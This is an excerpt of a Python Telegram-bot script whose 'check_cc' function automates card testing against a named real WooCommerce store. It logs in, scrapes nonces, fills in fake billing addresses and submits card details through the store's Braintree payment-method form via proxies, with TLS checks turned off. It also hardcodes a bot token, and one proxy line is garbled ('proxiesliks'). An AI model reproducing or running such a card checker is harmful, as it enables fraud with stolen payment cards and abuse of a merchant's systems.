...
# Bot token
TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8009942983:AAEJPO1nz2qYYuE-gPzhHtU7VtzbR4_BOxQ')
...
def generate_address():
    ...
    streets = ["123 Allen St", "123 Allen St"]
    zips = ["10002", "10012"]
...
async def check_cc(cc_details):
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('https://infinitediscsvipclub.com/my-account/', headers=headers, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                text = await r.text()
            ...
            async with session.post('https://infinitediscsvipclub.com/my-account/', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                pass

            async with session.get('https://infinitediscsvipclub.com/my-account/edit-address/', headers=headers, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                text = await r.text()
                address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', text).group(1)

            data = {
                'billing_first_name': first_name, 'billing_last_name': last_name, 'billing_country': 'US',
            ...
            async with session.post('https://infinitediscsvipclub.com/my-account/edit-address/billing/', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                pass

            async with session.get('https://infinitediscsvipclub.com/my-account/add-payment-method/', headers=headers, proxy=proxiesliks['http'] if proxies else None, ssl=False) as r:
                text = await r.text()
            ...
            async with session.post('https://infinitediscsvipclub.com/wp-admin/admin-ajax.php', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
            ...
            headers.update({
                'authority': 'infinitediscsvipclub.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://infinitediscsvipclub.com',
            ...
            data = [
                ...
                ('wc_braintree_credit_card_payment_nonce', tok), ('wc_braintree_device_data', '{"correlation_id":"a77e23d8f52fdb5f0542d91bcd3229d9"}'),
            ...
            async with session.post('https://infinitediscsvipclub.com/my-account/add-payment-method/', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as response:
